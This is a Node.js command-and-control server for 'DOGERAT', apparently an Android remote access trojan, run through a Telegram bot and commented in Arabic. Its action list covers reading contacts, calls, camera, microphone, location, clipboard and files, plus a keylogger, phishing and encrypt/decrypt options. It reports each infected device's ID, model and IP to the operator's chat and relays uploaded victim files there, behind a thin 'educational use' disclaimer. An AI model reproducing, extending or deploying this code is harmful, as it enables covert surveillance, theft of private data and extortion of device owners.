const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// تحميل بيانات الإعدادات
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true, request: {} });

const appData = new Map();

// قائمة الإجراءات المتاحة
const actions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯', 
    '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
    '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙰𝚕𝚕 ✯'
];

// دالة لتنظيف النص من مشاكل HTML
function sanitizeText(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// دالة لإرسال رسائل آمنة
function sendSafeMessage(chatId, text, options = {}) {
    const safeText = sanitizeText(text);
    return bot.sendMessage(chatId, safeText, {
        parse_mode: 'HTML',
        ...options
    });
}

// endpoint لرفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    try {
        const fileBuffer = req.file.buffer;
        const fileName = req.file.originalname;
        
        bot.sendDocument(data.id, fileBuffer, {
            caption: `File received: ${fileName}`,
            parse_mode: 'HTML'
        }, {
            filename: fileName,
            contentType: 'application/octet-stream'
        });
        
        res.send('Done');
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Error');
    }
});

// endpoint للحصول على المضيف
app.get('/host', (req, res) => {
    res.send(data.host || 'https://your-app.onrender.com/');
});

// endpoint للصحة
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// التعامل مع اتصالات Socket
io.on('connection', socket => {
    try {
        const deviceId = socket.handshake.headers['device-id'] || 
                        socket.id || 
                        'unknown-device';
        const deviceModel = socket.handshake.headers['user-agent'] || 'unknown-model';
        const deviceIp = socket.handshake.headers['x-forwarded-for'] || 
                        socket.handshake.address || 
                        'unknown-ip';
        const connectionTime = new Date().toLocaleString();

        socket.deviceId = deviceId;
        socket.deviceModel = deviceModel;

        const connectMessage = `
<b>🟢 New Device Connected</b>

<b>Device ID:</b> ${deviceId}
<b>Model:</b> ${deviceModel}
<b>IP:</b> ${deviceIp}
<b>Time:</b> ${connectionTime}
        `.trim();

        sendSafeMessage(data.id, connectMessage);

        // التعامل مع انقطاع الاتصال
        socket.on('disconnect', (reason) => {
            const disconnectMessage = `
<b>🔴 Device Disconnected</b>

<b>Device ID:</b> ${deviceId}
<b>Model:</b> ${deviceModel}
<b>IP:</b> ${deviceIp}
<b>Time:</b> ${new Date().toLocaleString()}
<b>Reason:</b> ${reason}
            `.trim();

            sendSafeMessage(data.id, disconnectMessage);
        });

        // التعامل مع الرسائل من الأجهزة
        socket.on('message', (message) => {
            const receivedMessage = `
<b>📨 Message Received</b>

<b>From:</b> ${deviceId}
<b>Message:</b> ${message}
            `.trim();

            sendSafeMessage(data.id, receivedMessage);
        });

        // التعامل مع الأخطاء
        socket.on('error', (error) => {
            console.error('Socket error:', error);
        });

    } catch (error) {
        console.error('Connection error:', error);
    }
});

// التعامل مع أوامر التليجرام
bot.on('message', (msg) => {
    try {
        const chatId = msg.chat.id;
        const messageText = msg.text;

        if (messageText === '/start') {
            const welcomeMessage = `
<b>🤖 Welcome to DOGERAT Control Panel</b>

This is a remote device management system.

<b>Developed by:</b> @CYBERSHIELDX

<b>⚠️ Important:</b> Use responsibly and legally.
            `.trim();

            sendSafeMessage(chatId, welcomeMessage, {
                reply_markup: {
                    keyboard: [
                        ['📱 Devices', '⚡ Actions'],
                        ['ℹ️ About']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: false
                }
            });
        }
        else if (messageText === '📱 Devices') {
            const devicesCount = io.sockets.sockets.size;
            
            if (devicesCount === 0) {
                sendSafeMessage(chatId, '<b>❌ No devices connected</b>');
            } else {
                let devicesList = `<b>📱 Connected Devices: ${devicesCount}</b>\n\n`;
                let deviceIndex = 1;
                
                io.sockets.sockets.forEach((socket, id) => {
                    devicesList += `<b>${deviceIndex}. ${socket.deviceId || id}</b>\n`;
                    devicesList += `<b>Model:</b> ${socket.deviceModel || 'Unknown'}\n`;
                    devicesList += `<b>IP:</b> ${socket.handshake.address || 'Unknown'}\n\n`;
                    deviceIndex++;
                });

                sendSafeMessage(chatId, devicesList, {
                    reply_markup: {
                        keyboard: [
                            ['📱 Devices', '⚡ Actions'],
                            ['ℹ️ About', '🔄 Refresh']
                        ],
                        resize_keyboard: true
                    }
                });
            }
        }
        else if (messageText === '⚡ Actions') {
            const actionsMessage = `
<b>⚡ Available Actions</b>

Select an action to perform on connected devices.

<b>Note:</b> Some features require device permissions.
            `.trim();

            sendSafeMessage(chatId, actionsMessage, {
                reply_markup: {
                    keyboard: [
                        ['📞 Calls', '📸 Camera'],
                        ['📱 Contacts', '📁 Files'],
                        ['📍 Location', '📢 Notifications'],
                        ['🔙 Back to Main']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        else if (messageText === 'ℹ️ About') {
            const aboutMessage = `
<b>ℹ️ About DOGERAT</b>

<b>Version:</b> 1.0.0
<b>Developer:</b> @CYBERSHIELDX

<b>⚠️ Disclaimer:</b>
This tool is for educational and authorized testing purposes only. Misuse is prohibited.
            `.trim();

            sendSafeMessage(chatId, aboutMessage);
        }
        else if (messageText === '🔙 Back to Main') {
            sendSafeMessage(chatId, '<b>🏠 Main Menu</b>', {
                reply_markup: {
                    keyboard: [
                        ['📱 Devices', '⚡ Actions'],
                        ['ℹ️ About']
                    ],
                    resize_keyboard: true
                }
            });
        }
        else if (messageText === '🔄 Refresh') {
            const devicesCount = io.sockets.sockets.size;
            sendSafeMessage(chatId, `<b>🔄 Refreshed</b>\n\n<b>Connected Devices:</b> ${devicesCount}`);
        }

    } catch (error) {
        console.error('Bot message error:', error);
        bot.sendMessage(msg.chat.id, '❌ Error processing your request');
    }
});

// إرسال ping دوري للأجهزة
setInterval(() => {
    try {
        io.sockets.sockets.forEach((socket, id) => {
            socket.emit('ping', { timestamp: Date.now() });
        });
    } catch (error) {
        console.error('Ping error:', error);
    }
}, 30000); // كل 30 ثانية

// الحفاظ على السيرفر نشط (لـ Render)
setInterval(() => {
    try {
        if (data.host && data.host.startsWith('http')) {
            https.get(data.host, (res) => {
                console.log('Keep-alive ping sent');
            }).on('error', (err) => {
                console.log('Keep-alive ping failed:', err.message);
            });
        }
    } catch (error) {
        console.error('Keep-alive error:', error);
    }
}, 120000); // كل دقيقتين

// معالجة الأخطاء غير الملتقطة
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Socket.IO server is active`);
    console.log(`🤖 Telegram bot is polling for messages`);
});
